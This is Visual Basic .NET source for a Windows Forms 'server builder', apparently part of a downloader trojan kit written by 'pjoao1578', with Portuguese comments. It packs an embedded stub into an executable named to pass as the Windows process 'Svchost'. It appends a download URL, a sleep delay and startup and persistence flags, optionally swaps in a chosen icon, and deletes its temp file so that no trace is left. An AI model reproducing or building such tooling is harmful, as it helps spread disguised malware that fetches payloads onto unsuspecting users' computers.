Imports System
Imports System.Text
Imports System.IO
Imports System.ComponentModel
Imports Microsoft.VisualBasic.CompilerServices
Imports System.CodeDom.Compiler
Imports Microsoft.VisualBasic
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports System.Windows.Forms.Form
Imports System.Windows.Forms.Binding
Imports System.Windows.Forms.TextBox


'Coded By pjoao1578
'v5
Public Class Creat_Server_DownloadFile
#Region "Creat_Server_DownloadFile"
    Const spl = "MicrosoftCorporationSvchost" 'senha stub e cliente
    Dim stub As String 'stub
    Dim text1, text2 As String 'textbos
    Dim ver As String = "icon, 2,6" 'vercion do server criado
#End Region

    Private Sub Creat_Server_DownloadFile_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            Me.Timer1.Start() 'rodom strings
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim temp As String = IO.Path.GetTempPath() & "Svchost.exe" 'chamar stub pra fazer o server e nome da stub
        Dim dialog As New SaveFileDialog
        dialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
        dialog.Filter = "Server EXE|*.exe" 'salvar como .exe
        dialog.FileName = "Svchost" 'nome sugerido ao executavel
        If (dialog.ShowDialog = DialogResult.OK) Then
            text1 = Me.TextBox1.Text 'TextBox'URL
            text2 = Me.NumericUpDown2.Value 'NumericUpDown2 /sleep
            IO.File.WriteAllBytes(temp, My.Resources.Svchost) 'stub Svchost
            FileOpen(1, temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
            stub = Space$(LOF(1))
            FileGet(1, stub)
            FileClose(1)
            Try
                FileOpen(1, dialog.FileName, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                FilePut(1, stub & spl & text1 & spl & text2 & spl & Me.check1.CheckState &
                spl & Me.check2.CheckState & spl & Me.hidemexe.CheckState & spl & Me.pesist.CheckState &
                spl & Me.TextBox3.Text & spl) 'URL,sleep,add ao aranque do windows e add ao startup & pesist 
                FileClose(1)
                'icone
                IO.File.WriteAllBytes(Application.StartupPath & "\res.exe", My.Resources.Res)
                If Not PictureBox1.Image Is Nothing Then
                    Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -addoverwrite " & dialog.FileName & ", " & dialog.FileName & ", " & Me.PictureBox1.Tag.ToString & ", " & ver, AppWinStyle.Hide)
                End If
                MsgBox("   O Server Foi Criado", MessageBoxIcon.Asterisk) 'mensagem
                If Me.CheckBox2.Checked = True Then
                    Me.Close()
                Else

                End If
            Catch ex As Exception
                MsgBox("   Erro !! Esse Arquivo Não Pode ser Substituido", MessageBoxIcon.Error) 'mensagem
                Form1.ListBox1.Items.Add("Erro Ao Fazer o Server DownloadFile !")
            End Try
        End If
        Try 'obrigatorio o Try / ou ira dara erro
            My.Computer.FileSystem.DeleteFile(temp) 'deletar Stub que vai pra pasta Temp nao e utilisada para nao deixar rastros em computer
        Catch ex As Exception 'erro nao report 
        End Try
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        For i = 0 To 15 'rodom strings
            Threading.Thread.Sleep(15) 'sleep 15
            Application.DoEvents()
            Me.TextBox3.Text = Me.RandomString1(Me.NumericUpDown1.Value) 'rodom strings
        Next
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        'activer rondom
        If CheckBox1.Checked = True Then
            Me.Timer2.Start() 'stop
        Else
            Me.Timer2.Stop() 'stop
            Me.Timer2.Enabled = False 'false
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        For i = 0 To 15 'rodom strings
            Threading.Thread.Sleep(15) 'sleep 15
            Application.DoEvents()
            Me.TextBox3.Text = RandomString1(Me.NumericUpDown1.Value) 'rodom strings
        Next
        Me.Timer1.Stop() 'stop
        Me.Timer1.Enabled = False 'false
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick 'interval 50
        'activer rondom
        For i = 0 To 15 'rodom strings
            Application.DoEvents()
            Me.TextBox3.Text = RandomString1(Me.NumericUpDown1.Value) 'rodom strings
        Next
    End Sub

    Public Function RandomString1(ByVal longitud As Integer) As String 'rodom strings
        Dim cadena As String = "ییငమ☺☻♥♦¶§▬↨↑↓帕اماefghijklmnopq0123456▬↨↑↓→yzABCDEFGHIJKLMNO0▼123456789PQRSTUVWXYZ0123456789"

        Dim r As New Random
        Dim l As Integer
        Dim sb As New System.Text.StringBuilder
        For i = 1 To longitud
            l = r.Next(0, 62)
            Try
                sb.Append(cadena.Substring(l, 1))
            Catch ex As Exception 'erro nao report
                MsgBox("   Erro !! Random As Strings", MessageBoxIcon.Error) 'mensagem
                Form1.ListBox1.Items.Add("Erro Ao Fazer o Server !")
                ProjectData.SetProjectError(ex)
                ProjectData.ClearProjectError()
            End Try
        Next

        Return sb.ToString()
    End Function

    Private Sub Creat_Server_DownloadFile_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        Me.Timer1.Stop()
        Me.Timer1.Enabled = False
    End Sub

    Private Sub Creat_Server_DownloadFile_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Me.Timer1.Stop()
        Me.Timer1.Enabled = False
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        'add ico de server
        Dim ofd As New OpenFileDialog With {.Filter = "Icon File (*.ico) |*.ico"}
        If ofd.ShowDialog = DialogResult.OK Then
            PictureBox1.Image = Image.FromFile(ofd.FileName) : PictureBox1.Tag = ofd.FileName
        End If
    End Sub
End Class